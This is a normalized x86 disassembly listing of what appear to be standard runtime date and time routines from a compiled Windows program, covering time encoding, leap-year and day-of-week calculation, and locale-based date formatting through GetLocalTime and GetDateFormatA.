mov eax esi
call sub_404184
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax [ rw-data ]
call sub_407df0
sub_409b88
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_404554
mov edx esp
xor ecx ecx
call sub_4099a0
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_409bb4
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_404554
mov edx esp
xor ecx ecx
call sub_4099a0
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_409bfc
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_409c40
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_409cb0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_409bfc
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_407dd4
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_407dd4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_407dd4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409d0c
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_409d48
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_409d0c
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_409e10
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_409d48
test al al
jne r-xdata
fld [ esp ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_407df0
sub_409e40
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_409bfc
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_407dd4
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_407dd4
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_407dd4
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_409d0c
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_409f8c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_409e40
pop esi
pop ecx
pop ebp
retn 0x8
sub_409fac
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_409bfc
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_409fd4
add esp 0xffffffe8
lea eax [ esp + 0x8 ]
push eax
call GetLocalTime
mov cx [ esp + 0xe ]
mov dx [ esp + 0xa ]
mov ax [ esp + 0x8 ]
call sub_409e10
fstp [ esp ]
fwait
fld [ esp ]
add esp 0x18
retn
sub_40a014
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_4028f0
sub_40a058
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_404354
mov edx eax
mov eax ebx
call sub_40a014
pop ecx
pop ebx
pop ebp
retn
sub_40a078
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_408c9c
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_40a014
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a0c4
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_40a0f0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_409f8c
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_40a128
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_409cb0
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_40a168
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40a2b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404094
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40412c
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404554
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a2bd
lea eax [ ebp - 0x118 ]
call sub_404094
lea eax [ ebp - 0x4 ]
call sub_404094
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_404304
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_404354
mov edx eax
mov eax [ ebx ]
call sub_40c6ac
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40c820
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_4045b4
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40c7bc
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_40428c
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40c820
mov ecx eax
mov eax ebx
mov edx esi
call sub_404184
sub_40a2d0
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40a3ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404094
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40412c
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40412c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a3b5
lea eax [ ebp - 0x4 ]
call sub_404094
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_404304
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404554
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_404354
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_4045b4
sub_40a3d8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40ab59
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ab60
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_4040b8
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40c8a0
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40c880
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_40a014
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40c8a0
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_40a014
pop ecx
mov al [ eax + lookup_table_40a4bb ]
jmp [ eax * 4 + jump_table_40a4f4 ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_40a0c4
pop ecx
push ebp
call sub_40a0f0
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_40a0c4
pop ecx
push ebp
call sub_40a0f0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_40a168
pop ecx
mov eax [ ebp - 0x24 ]
call sub_40a058
pop ecx
jmp r-xdata
push ebp
call sub_40a0c4
pop ecx
push ebp
call sub_40a0f0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_40a2d0
pop ecx
mov eax [ ebp - 0x28 ]
call sub_40a058
pop ecx
jmp r-xdata
push ebp
call sub_40a0c4
pop ecx
push ebp
call sub_40a0f0
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_40a0c4
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_40a0c4
pop ecx
push ebp
call sub_40a128
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_40a0c4
pop ecx
push ebp
call sub_40a128
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_40a0c4
pop ecx
push ebp
call sub_40a128
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_40a0c4
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_40a0c4
pop ecx
push ebp
call sub_40a128
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_40a128
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408af8
test eax eax
jne r-xdata
push ebp
call sub_40a0c4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a3d8
pop ecx
push ebp
call sub_40a128
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_40a078
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_40a078
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_40a078
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_40a0f0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_40a078
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_40a078
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_40a078
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a3d8
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a3d8
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_40a078
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408af8
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_40a014
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a3d8
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_40a014
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_40a014
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_40a058
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409fac
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40a058
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408af8
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_40a014
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_40a014
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_40a058
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409fac
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40a058
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40c8a0
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408af8
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_40a014
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a3d8
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_40a078
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408af8
test eax eax
jne r-xdata
push ebp
call sub_40a0f0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409fac
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40a058
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a058
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a058
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40c8a0
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a3d8
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_40a014
pop ecx
jmp r-xdata
push ebp
call sub_40a0f0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409fac
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40a058
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408af8
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408af8
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408af8
test eax eax
jne r-xdata
jmp r-xdata
sub_40ab8c
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_40a3d8
pop ecx
push ebp
mov eax ebx
call sub_40a3d8
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_404184
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40abfc
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_404354
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40ac20
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40abfc
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_404354
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40acb4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40ad2d
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ad34
lea eax [ ebp - 0x8 ]
call sub_404094
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40abfc
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_404354
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_4045b4
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_408090
test eax eax
jne r-xdata
mov eax edi
call sub_404354
add [ esi ] eax
mov bl 0x1
sub_40ad40
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40abfc
mov eax esi
call sub_404354
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
